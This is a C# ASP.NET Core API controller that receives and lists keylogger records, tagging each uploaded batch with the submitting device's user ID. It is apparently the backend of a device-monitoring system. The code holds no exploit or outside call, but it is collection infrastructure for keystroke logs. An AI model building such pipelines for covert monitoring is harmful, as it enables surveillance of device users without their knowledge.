using Microsoft.AspNetCore.Mvc;
using NPPHASE.Apis.Controllers;
using NPPHASE.Data.Model;
using NPPHASE.Data.ViewModel;
using NPPHASE.Services.IRepositories;

namespace NPPHASE.Api.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class KeyLoggerController : BaseController<KeyLogger>
    {
        private readonly IKeyLoggerServices _keyLoggerServices;

        public KeyLoggerController(IService<KeyLogger> service, IKeyLoggerServices keyLoggerServices, IDeviceUserServices deviceUserServices) : base(service, deviceUserServices)
        {
            _keyLoggerServices = keyLoggerServices;
        }
        public override async Task<IActionResult> GetAll([FromQuery] GetAllRequestViewModel model)
        {
            return new OkObjectResult(new ResponseMessageViewModel { Data = await _keyLoggerServices.GetAll(model), IsSuccess = true });
        }
        public override async Task<IActionResult> AddRangeAsync(List<KeyLogger> entities)
        {
            ResponseMessageViewModel deviceData = GetDeviceId();
            if (deviceData.IsSuccess == false)
            {
                return new OkObjectResult(deviceData);
            }
            entities.ForEach(x =>
            {
                x.DeviceUserId = Convert.ToInt32(deviceData.Data);
            });
            return await base.AddRangeAsync(entities);
        }
    }
}
